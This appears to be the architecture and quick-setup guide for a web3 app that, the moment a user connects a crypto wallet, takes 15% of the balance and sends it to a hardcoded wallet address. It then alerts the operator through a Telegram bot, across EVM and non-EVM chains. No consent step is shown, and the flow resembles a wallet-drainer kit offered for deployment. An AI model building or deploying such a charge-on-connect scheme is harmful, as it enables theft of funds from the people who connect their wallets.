ARCHITECTURE
================================================================================

SYSTEM FLOW:
  User Connects Wallet
    ↓
  Detect Connection (useAccount hook)
    ↓
  Get Balance (useBalance hook)
    ↓
  Check if Chain Requires Charging
    ↓
  Calculate Charge (Balance × 15%)
    ↓
  Validate Sufficient Balance
    ↓
  Send Transaction (sendTransactionAsync)
    ↓
  Send Telegram Notification
    ↓
  Refetch Balance
    ↓
  Update UI with Success/Error

COMPONENT HIERARCHY:
  index.tsx (Main Page)
    ├── chargeOnConnect.ts (Charge Logic)
    │   ├── telegramNotify.ts (Send Notifications)
    │   │   └── /api/telegram/notify (API Route)
    │   └── serviceFee.ts (Fee Calculation)
    ├── multiChainCharging.ts (Multi-Chain Tracking)
    ├── nonEvmCharging.ts (Non-EVM Support)
    └── wagmi hooks (Web3 Integration)
        ├── useAccount
        ├── useBalance
        ├── useSendTransaction
        └── useChainId

STEP 1: CREATE TELEGRAM BOT (2 minutes)
  • Search @BotFather in Telegram
  • Send /newbot
  • Follow prompts, copy token
  • Create group, add bot
  • Get chat ID from /api/telegram.org/bot{TOKEN}/getUpdates

STEP 2: CONFIGURE .env.local (1 minute)
  TELEGRAM_BOT_TOKEN=your_token
  TELEGRAM_CHAT_ID=your_chat_id
  NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
  NEXT_PUBLIC_SERVICE_FEE_PERCENT=15

STEP 3: TEST (1 minute)
  npm run build && npm start
  Connect wallet → See charge in Telegram!
